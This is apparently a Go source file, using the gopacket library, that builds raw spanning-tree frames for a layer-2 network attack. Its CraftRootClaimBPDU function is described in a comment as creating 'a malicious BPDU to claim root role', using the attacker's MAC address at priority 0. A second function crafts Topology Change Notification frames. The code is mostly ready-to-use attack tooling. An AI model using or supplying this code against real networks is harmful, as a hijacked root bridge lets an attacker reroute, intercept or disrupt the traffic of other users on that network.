package stp

import (
	"encoding/binary"
	"net"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

// CustomSTPLayer represents a Spanning Tree Protocol Configuration BPDU
type CustomSTPLayer struct {
	layers.BaseLayer
	ProtocolID        uint16
	ProtocolVersionID uint8
	BPDUType          uint8
	Flags             uint8
	RootID            uint64
	RootPathCost      uint32
	BridgeID          uint64
	PortID            uint16
	MessageAge        uint16
	MaxAge            uint16
	HelloTime         uint16
	ForwardDelay      uint16
}

// LayerType returns the layer type for STP.
var LayerTypeCustomSTP = gopacket.RegisterLayerType(2000, gopacket.LayerTypeMetadata{Name: "CustomSTP", Decoder: gopacket.DecodeFunc(nil)})

func (s *CustomSTPLayer) LayerType() gopacket.LayerType {
	return LayerTypeCustomSTP
}

func (s *CustomSTPLayer) SerializeTo(b gopacket.SerializeBuffer, opts gopacket.SerializeOptions) error {
	bytes, err := b.PrependBytes(35)
	if err != nil {
		return err
	}

	binary.BigEndian.PutUint16(bytes[0:2], s.ProtocolID)
	bytes[2] = s.ProtocolVersionID
	bytes[3] = s.BPDUType
	bytes[4] = s.Flags

	binary.BigEndian.PutUint64(bytes[5:13], s.RootID)
	binary.BigEndian.PutUint32(bytes[13:17], s.RootPathCost)
	binary.BigEndian.PutUint64(bytes[17:25], s.BridgeID)
	binary.BigEndian.PutUint16(bytes[25:27], s.PortID)
	binary.BigEndian.PutUint16(bytes[27:29], s.MessageAge)
	binary.BigEndian.PutUint16(bytes[29:31], s.MaxAge)
	binary.BigEndian.PutUint16(bytes[31:33], s.HelloTime)
	binary.BigEndian.PutUint16(bytes[33:35], s.ForwardDelay)

	return nil
}

// CraftRootClaimBPDU creates a malicious BPDU to claim root role
func CraftRootClaimBPDU(attackerMAC net.HardwareAddr) ([]byte, error) {
	eth := layers.Ethernet{
		SrcMAC:       attackerMAC,
		DstMAC:       net.HardwareAddr{0x01, 0x80, 0xC2, 0x00, 0x00, 0x00},
		EthernetType: layers.EthernetTypeLLC,
	}

	llc := layers.LLC{
		DSAP:    0x42,
		SSAP:    0x42,
		Control: 0x03,
	}

	stpLayer := &CustomSTPLayer{
		ProtocolID:        0x0000,
		ProtocolVersionID: 0x00,
		BPDUType:          0x00,
		Flags:             0x00,
		RootID:            createBridgeID(0, attackerMAC),
		RootPathCost:      0,
		BridgeID:          createBridgeID(0, attackerMAC),
		PortID:            0x8002,
		MessageAge:        0,
		MaxAge:            20 * 256,
		HelloTime:         2 * 256,
		ForwardDelay:      15 * 256,
	}

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	err := gopacket.SerializeLayers(buf, opts, &eth, &llc, stpLayer)
	if err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}

// CraftTCNBPDU creates a Topology Change Notification BPDU
func CraftTCNBPDU(attackerMAC net.HardwareAddr) ([]byte, error) {
	eth := layers.Ethernet{
		SrcMAC:       attackerMAC,
		DstMAC:       net.HardwareAddr{0x01, 0x80, 0xC2, 0x00, 0x00, 0x00},
		EthernetType: layers.EthernetTypeLLC,
	}

	llc := layers.LLC{
		DSAP:    0x42,
		SSAP:    0x42,
		Control: 0x03,
	}

	tcnLayer := &CustomTCNLayer{}

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	err := gopacket.SerializeLayers(buf, opts, &eth, &llc, tcnLayer)
	if err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}

type CustomTCNLayer struct {
	layers.BaseLayer
}

var LayerTypeCustomTCN = gopacket.RegisterLayerType(2003, gopacket.LayerTypeMetadata{Name: "CustomTCN", Decoder: gopacket.DecodeFunc(nil)})

func (s *CustomTCNLayer) LayerType() gopacket.LayerType {
	return LayerTypeCustomTCN
}

func (s *CustomTCNLayer) SerializeTo(b gopacket.SerializeBuffer, opts gopacket.SerializeOptions) error {
	bytes, err := b.PrependBytes(4)
	if err != nil {
		return err
	}
	bytes[0] = 0x00
	bytes[1] = 0x00
	bytes[2] = 0x00
	bytes[3] = 0x80
	return nil
}

func createBridgeID(priority uint16, mac net.HardwareAddr) uint64 {
	if len(mac) < 6 {
		return 0
	}
	var id uint64
	id = uint64(priority) << 48
	macVal := uint64(mac[0])<<40 | uint64(mac[1])<<32 | uint64(mac[2])<<24 |
		uint64(mac[3])<<16 | uint64(mac[4])<<8 | uint64(mac[5])
	return id | macVal
}
